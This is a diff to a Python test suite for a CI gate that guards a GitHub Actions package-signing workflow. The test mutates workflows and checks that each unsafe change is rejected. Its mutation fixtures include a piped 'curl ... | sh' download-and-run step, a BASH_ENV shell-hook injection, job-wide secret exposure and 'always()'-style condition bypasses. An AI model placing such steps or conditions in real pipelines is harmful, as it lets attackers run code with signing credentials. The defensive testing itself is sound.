@@ -198,42 +198,177 @@ class HandoffControls(unittest.TestCase):
         metadata.write_text(json.dumps(good))
 
     def test_split_workflow_mutations_are_rejected(self):
+        """Each mutation must be caught BY THE ASSERTION IT VIOLATES, not by the digest pin.
+
+        This test used to assert `any(problem.assertion == 'A9' ...)`. Every check in the signing
+        family emits A9, and one of them digests the whole privileged job -- so every mutation of
+        that job reddened the pin, and all 22 arms passed whether or not the check each one was
+        written for existed at all. Two mutations as different as a ref narrowing and an `always()`
+        dependency bypass produced byte-identical findings.
+
+        So each arm now names the message it must produce, and asserts it in two separate halves:
+        first that the PIN fires (the reviewed surface changed), then -- with the digest re-pinned
+        to the mutated job -- that the SPECIFIC assertion fires. Neither half can launder the other.
+        """
         spec = importlib.util.spec_from_file_location('promotion', ROOT / 'eng/ci/promotion-contract-gate.py')
         gate = importlib.util.module_from_spec(spec); spec.loader.exec_module(gate)
         workflows, error = gate.load_workflows(str(ROOT / '.github/workflows'))
         self.assertIsNone(error)
-        self.assertEqual([], gate.check(workflows))
+        self.assertEqual([], gate.check(workflows), 'the committed tree must satisfy the contract (liveness)')
+
         def final(w): return w['official-build.yml']['jobs']['packages']
         def source(w): return w['official-build.yml']['jobs']['build-packages']
         def step(w, name): return next(s for s in final(w)['steps'] if s.get('name') == name)
+
+        real = gate.finalizer_contract()
+        PIN = 'privileged executable contract changed'
+
+        def repin(w):
+            """Re-pin the digest to the MUTATED job, so only the specific check can still fire."""
+            model = dict(real)
+            model['sha256'] = hashlib.sha256(json.dumps(
+                {'job': final(w), 'workflow_env': w['official-build.yml'].get('env', {}),
+                 'workflow_defaults': w['official-build.yml'].get('defaults', {})},
+                sort_keys=True, separators=(',', ':')).encode()).hexdigest()
+            gate.finalizer_contract = lambda: model
+
+        IF_PINNED = 'finalizer run condition must be exactly the reviewed one'
+        STEPS_PINNED = 'finalizer steps must be exactly the reviewed list, in order'
         mutations = {
-            'source authority': lambda w: source(w)['permissions'].update({'id-token': 'write'}),
-            'source secret': lambda w: source(w).update({'env': {'CERT': '${{ secrets.CERT }}'}}),
-            'unchecked ref': lambda w: source(w).pop('if'),
-            'bypass build': lambda w: final(w).update({'if': 'always()'}),
-            'persistent runner': lambda w: final(w).update({'runs-on': 'self-hosted'}),
-            'source checkout': lambda w: final(w)['steps'].append({'uses': 'actions/checkout@'+'a'*40}),
-            'arbitrary shell': lambda w: final(w)['steps'].append({'run': 'curl https://example.invalid/helper | sh'}),
-            'external action': lambda w: final(w)['steps'].append({'uses': 'vendor/action@'+'a'*40}),
-            'expanded finalizer authority': lambda w: final(w)['permissions'].update({'contents': 'write'}),
-            'inherited shell hook': lambda w: w['official-build.yml']['env'].update({'BASH_ENV': 'official-handoff/hook'}),
-            'replaced verifier body': lambda w: step(w, 'Verify unsigned handoff contents').update({'run': 'echo verified'}),
-            'downloaded helper': lambda w: final(w)['steps'].append({'run': 'python3 official-handoff/helper.py'}),
-            'tool restore': lambda w: final(w)['steps'].append({'run': 'dotnet tool restore'}),
-            'unprotected job': lambda w: final(w).pop('environment'),
-            'job-wide credentials': lambda w: final(w)['env'].update({'CERT': '${{ secrets.CERT }}'}),
-            'digest warning': lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'digest-mismatch': 'warn'}),
-            'artifact name instead of ID': lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'name': 'other'}),
-            'skip verification': lambda w: step(w, 'Verify unsigned handoff contents').update({'if': 'false'}),
-            'softened verification': lambda w: step(w, 'Verify unsigned handoff contents').update({'continue-on-error': True}),
-            'wrong output ID': lambda w: source(w)['outputs'].update({'handoff-id': '123'}),
-            'sign after hashing': lambda w: final(w)['steps'].reverse(),
-            'rival source artifact': lambda w: source(w)['steps'].append({'uses': 'actions/upload-artifact@'+'a'*40, 'with': {'name': 'other', 'path': 'packages/'}}),
+            'source execution must have read-only permissions':
+                lambda w: source(w)['permissions'].update({'id-token': 'write'}),
+            'source execution must not reference secrets':
+                lambda w: source(w).update({'env': {'CERT': '${{ secrets.CERT }}'}}),
+            'official source must restrict dispatch refs':
+                lambda w: source(w).pop('if'),
+            'source steps cannot soften failure':
+                lambda w: source(w)['steps'][0].update({'continue-on-error': True}),
+            'finalizer requires a fresh hosted runner':
+                lambda w: final(w).update({'runs-on': 'self-hosted'}),
+            'finalizer authority must be exactly the reviewed set':
+                lambda w: final(w)['permissions'].update({'contents': 'write'}),
+            'finalizer must use the signing environment':
+                lambda w: final(w).pop('environment'),
+            'signing secrets must be step-scoped':
+                lambda w: final(w)['env'].update({'CERT': '${{ secrets.CERT }}'}),
+            'inherited workflow environment must be exactly the reviewed set':
+                lambda w: w['official-build.yml']['env'].update({'BASH_ENV': 'official-handoff/hook'}),
+            # The unsigned opt-out is a committed decision. Weakening it, or restoring the ambient
+            # repository-variable form whose absent value resolved permissive, must be refused.
+            'unsigned-release opt-out must be the reviewed committed value': [
+                lambda w: final(w)['env'].update({'ALLOW_UNSIGNED_RELEASE': 'false'}),
+                lambda w: final(w)['env'].update(
+                    {'ALLOW_UNSIGNED_RELEASE': "${{ vars.ALLOW_UNSIGNED_RELEASE || 'true' }}"}),
+                lambda w: final(w)['env'].pop('ALLOW_UNSIGNED_RELEASE'),
+            ],
+            # The producer decides whether to BUILD an unsigned promotable set and the publisher
+            # whether to PUSH one. release.yml asks a reader to keep the two in step; nothing
+            # enforced it, and a disagreement means every release built unsigned then refused at the
+            # last gate before the push, or the reverse.
+            'producing build and release workflow must agree on the unsigned-release opt-out':
+                lambda w: next(j for j in w['release.yml']['jobs'].values()
+                               if 'ALLOW_UNSIGNED_RELEASE' in (j.get('env') or {}))
+                              ['env'].update({'ALLOW_UNSIGNED_RELEASE': 'false'}),
+            'the release workflow must state its unsigned-release decision':
+                lambda w: next(j for j in w['release.yml']['jobs'].values()
+                               if 'ALLOW_UNSIGNED_RELEASE' in (j.get('env') or {}))
+                              ['env'].pop('ALLOW_UNSIGNED_RELEASE'),
+            'finalizer cannot soften its own failure':
+                lambda w: final(w).update({'continue-on-error': True}),
+            'handoff digest mismatch must fail':
+                lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'digest-mismatch': 'warn'}),
+            'handoff cannot select another run or repository':
+                lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'name': 'other'}),
+            'required finalization step has an unexpected skip condition':
+                lambda w: step(w, 'Verify unsigned handoff contents').update({'if': 'false'}),
+            'finalizer checks cannot soften failure':
+                lambda w: step(w, 'Verify unsigned handoff contents').update({'continue-on-error': True}),
+            'source must export immutable transfer evidence':
+                lambda w: source(w)['outputs'].update({'handoff-id': '123'}),
+            'handoff, signing, payload verification and final attestation order is invalid':
+                lambda w: final(w)['steps'].reverse(),
+            'source must not publish rival package artifacts':
+                lambda w: source(w)['steps'].append(
+                    {'uses': 'actions/upload-artifact@' + 'a' * 40, 'with': {'name': 'other', 'path': 'packages/'}}),
+            # Appending ANY step to the privileged job breaks the reviewed step list. That list sat
+            # in the contract read by nothing, so these shapes -- a piped shell download, a source
+            # checkout, an unapproved action, build tooling, a downloaded helper -- were caught by
+            # the pin alone, by no assertion that could name what had appeared.
+            STEPS_PINNED: [
+                lambda w: final(w)['steps'].append({'run': 'curl https://example.invalid/helper | sh'}),
+                lambda w: final(w)['steps'].append({'uses': 'actions/checkout@' + 'a' * 40}),
+                lambda w: final(w)['steps'].append({'uses': 'vendor/action@' + 'a' * 40}),
+                lambda w: final(w)['steps'].append({'run': 'dotnet tool restore'}),
+                lambda w: final(w)['steps'].append({'run': 'python3 official-handoff/helper.py'}),
+            ],
+            # THE BYPASS FAMILY. Previously ONE arm (`always()`), which could not be told apart from
+            # a safe ref narrowing. Every shape here must be refused -- including the ones a
+            # substring scan for 'always(' misses: case, spacing, and the same state spelled as a
+            # context rather than a function.
+            IF_PINNED: [
+                lambda w: final(w).update({'if': 'always()'}),
+                lambda w: final(w).update({'if': 'ALWAYS()'}),
+                lambda w: final(w).update({'if': 'always ()'}),
+                lambda w: final(w).update({'if': '!cancelled()'}),
+                lambda w: final(w).update({'if': "needs.build-packages.result != 'cancelled'"}),
+                # No status function anywhere, and still refused: reachable where the source
+                # condition is false, which is the hole the first narrowing attempt shipped.
+                lambda w: final(w).update({'if': "github.event_name == 'workflow_dispatch'"}),
+                lambda w: final(w).update(
+                    {'if': "startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'"}),
+                lambda w: final(w).update({'if': 'true'}),
+                lambda w: final(w).pop('if'),
+            ],
         }
-        for name, mutate in mutations.items():
-            with self.subTest(name=name):
-                model = copy.deepcopy(workflows); mutate(model)
-                self.assertTrue(any(problem.assertion == 'A9' for problem in gate.check(model)))
+
+        try:
+            for expected, mutate in mutations.items():
+                for index, apply_mutation in enumerate(mutate if isinstance(mutate, list) else [mutate]):
+                    with self.subTest(expected=expected, variant=index):
+                        model = copy.deepcopy(workflows)
+                        apply_mutation(model)
+
+                        # HALF 1: the reviewed surface changed, so the pin reports it. Source-only
+                        # mutations are exempt -- the pin does not cover the source job, by design.
+                        gate.finalizer_contract = lambda: real
+                        touches_pinned = (
+                            final(model) != final(workflows)
+                            or model['official-build.yml'].get('env') != workflows['official-build.yml'].get('env'))
+                        if touches_pinned:
+                            self.assertIn(PIN, ' | '.join(p.message for p in gate.check(model)))
+
+                        # HALF 2: with the pin satisfied, the specific assertion must still fire.
+                        repin(model)
+                        messages = [p.message for p in gate.check(model)]
+                        self.assertTrue(
+                            any(expected in m for m in messages),
+                            f'{expected!r} did not fire once the digest was re-pinned; got {messages}')
+        finally:
+            gate.finalizer_contract = lambda: real
+
+    def test_the_finalizer_condition_implies_the_source_condition(self):
+        """The privileged job must not be reachable where its dependency was not.
+
+        No assertion can decide implication between two GitHub expressions, so the contract keeps
+        both as exact strings and this test binds the one property that makes the pair safe by eye:
+        the finalizer condition appears verbatim inside the source condition. The first attempt at
+        narrowing the signing trigger broke exactly this -- `workflow_dispatch` carries no ref
+        restriction, so a manual run on an arbitrary branch satisfied the finalizer condition while
+        its dependency was skipped."""
+        spec = importlib.util.spec_from_file_location('promotion', ROOT / 'eng/ci/promotion-contract-gate.py')
+        gate = importlib.util.module_from_spec(spec); spec.loader.exec_module(gate)
+        contract = gate.finalizer_contract()
+        source_if, finalizer_if = contract['source_if'], contract['finalizer_if']
+        self.assertIn(finalizer_if, source_if,
+                      'the finalizer condition must be a verbatim disjunct of the source condition')
+        for token in ('always', 'failure(', 'cancelled', 'success('):
+            self.assertNotIn(token, finalizer_if.lower(),
+                             'the finalizer condition must not name a status-check function')
+        workflows, error = gate.load_workflows(str(ROOT / '.github/workflows'))
+        self.assertIsNone(error)
+        jobs = workflows['official-build.yml']['jobs']
+        self.assertEqual(source_if, jobs['build-packages']['if'], 'contract and workflow disagree on source_if')
+        self.assertEqual(finalizer_if, jobs['packages']['if'], 'contract and workflow disagree on finalizer_if')
 
 
 if __name__ == '__main__':
